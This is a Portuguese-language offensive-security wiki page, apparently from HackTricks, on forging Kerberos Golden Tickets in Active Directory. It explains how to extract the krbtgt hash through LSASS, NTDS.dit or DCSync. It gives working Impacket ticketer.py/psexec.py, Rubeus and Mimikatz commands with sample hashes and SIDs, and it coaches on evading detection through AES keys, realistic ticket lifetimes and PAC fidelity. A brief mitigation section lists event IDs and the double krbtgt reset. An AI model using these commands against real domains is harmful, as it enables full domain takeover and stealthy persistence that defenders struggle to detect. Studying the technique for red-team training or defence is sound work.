# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Um ataque **Golden Ticket** consiste na **criação de um Ticket Granting Ticket (TGT) legítimo personificando qualquer usuário** por meio do uso do **hash NTLM da conta krbtgt do Active Directory (AD)**. Essa técnica é particularmente vantajosa porque **permite acesso a qualquer serviço ou máquina** dentro do domínio como o usuário personificado. É crucial lembrar que as **credenciais da conta krbtgt nunca são atualizadas automaticamente**.<sup>[[1]](#references)</sup>

Para **obter o hash NTLM** da conta krbtgt, vários métodos podem ser utilizados. Ele pode ser extraído do **processo Local Security Authority Subsystem Service (LSASS)** ou do arquivo **NT Directory Services (NTDS.dit)** localizado em qualquer Domain Controller (DC) dentro do domínio. Além disso, **executar um ataque DCsync** é outra estratégia para obter esse hash NTLM, o que pode ser feito usando ferramentas como o **módulo lsadump::dcsync** do Mimikatz ou o **script secretsdump.py** do Impacket. É importante destacar que, para realizar essas operações, normalmente são necessários **privilégios de administrador do domínio ou um nível de acesso semelhante**.<sup>[[2]](#references)</sup>

Embora o hash NTLM seja um método viável para esse propósito, é **altamente recomendado** **forjar tickets usando as chaves Kerberos do Advanced Encryption Standard (AES) (AES128 e AES256)** por motivos de segurança operacional. Isso é ainda mais importante em domínios modernos, porque o **uso de RC4 está sendo eliminado gradualmente** e se destaca muito mais claramente na telemetria do Kerberos.<sup>[[5]](#references)</sup>
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Notas modernas sobre ticket crafting

Quando possível, **consulte LDAP e SYSVOL primeiro** e depois forge o ticket usando a política real do domínio e os valores PAC do usuário, em vez de inventá-los manualmente:<sup>[[4]](#references)</sup>
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` solicita ao DC os dados do usuário, do grupo, do NetBIOS e das políticas usados para criar um PAC mais realista.
- `/printcmd` exibe uma linha de comando offline contendo os campos do PAC recuperados, o que é útil caso você queira posteriormente forjar o mesmo ticket sem consultar o LDAP novamente.
- `/extendedupndns` adiciona os elementos `UpnDns` mais recentes do PAC, contendo o `samAccountName` e o SID da conta.
- `/oldpac` remove os buffers `Requestor` e `Attributes` mais recentes do PAC; isso é útil principalmente para testes de compatibilidade com ambientes mais antigos, não como prática padrão de tradecraft.

No Linux, versões recentes do Impacket também permitem adicionar as estruturas mais recentes do PAC e definir um período de validade realista:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` está em **horas**. O padrão é **10 anos**, o que gera muito ruído.
- `-extra-pac` adiciona as informações `UPN_DNS` mais recentes do PAC.
- `-old-pac` força o formato legado do PAC.
- `-extra-sid` é útil quando o PAC precisa de SIDs adicionais (por exemplo, em cenários de escalação de child para parent, abordados em [SID-History Injection](sid-history-injection.md)).

**Depois que** o **Golden Ticket for injetado**, você poderá acessar os arquivos compartilhados **(C$)** e executar serviços e WMI; portanto, poderá usar **psexec** ou **wmiexec** para obter um shell (parece que não é possível obter um shell via winrm).

### Contornando detecções comuns

As formas mais frequentes de detectar um Golden Ticket são por meio da **inspeção do tráfego Kerberos** na rede. Por padrão, o Mimikatz **assina o TGT por 10 anos**, o que se destacará como anômalo em solicitações TGS subsequentes feitas com ele.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Use os parâmetros `/startoffset`, `/endin` e `/renewmax` para controlar o deslocamento inicial, a duração e o número máximo de renovações (todos em minutos).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Infelizmente, o tempo de vida do TGT não é registrado nos eventos 4769, portanto você não encontrará essas informações nos logs de eventos do Windows. No entanto, o que você pode correlacionar é **a ocorrência de eventos 4769 sem um evento 4768 anterior**. **Não é possível solicitar um TGS sem um TGT** e, se não houver registro de emissão de um TGT, podemos inferir que ele foi forjado offline.

Em **builds mais recentes do Windows**, os Event IDs **4768** e **4769** também expõem uma telemetria muito melhor dos **tipos de criptografia**. Um TGT/TGS forjado usando **RC4 (`0x17`)** em um domínio onde `krbtgt`, clientes e serviços já possuem chaves AES é muito mais fácil de detectar do que era alguns anos atrás. Esse é mais um motivo para preferir **Golden Tickets baseados em AES** e corresponder o mais próximo possível à política Kerberos normal do domínio.

Outro problema de OPSEC é a **fidelidade do PAC**. Tickets com associações de grupos impossíveis, buffers PAC mais recentes ausentes ou metadados da conta que não correspondem ao LDAP são mais fáceis de detectar quando os defensores validam o conteúdo do PAC em relação aos dados do AD. Se você precisar de um TGT que pareça ter sido realmente emitido por um DC, consulte:

{{#ref}}
diamond-ticket.md
{{#endref}}

Também existem **limitações ambientais** à persistência. A conta `krbtgt` mantém um **histórico de 2 senhas**, portanto um TGT forjado pode continuar válido após o **primeiro** reset de `krbtgt` se tiver sido assinado com a chave anterior. É por isso que os defensores invalidam Golden Tickets **resetando `krbtgt` duas vezes** e aguardando pelo menos o tempo de vida máximo de um ticket do domínio entre os resets.<sup>[[3]](#references)</sup>

Para **bypassar essa detecção**, consulte os diamond tickets.

### Mitigação

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Outros pequenos truques que os defensores podem usar incluem **alertar sobre eventos 4769 para usuários sensíveis**, como a conta padrão de administrador do domínio, e alertar sobre o **uso de RC4 para `krbtgt`** em domínios que normalmente emitem tickets AES.<sup>[[5]](#references)</sup>

## Referências

- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kerberos: Golden Tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [3] [AD Forest Recovery - Reset the krbtgt password | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [4] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [5] [Microsoft – How to manage Kerberos KDC usage of RC4 for service account ticket issuance (CVE-2026-20833)](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
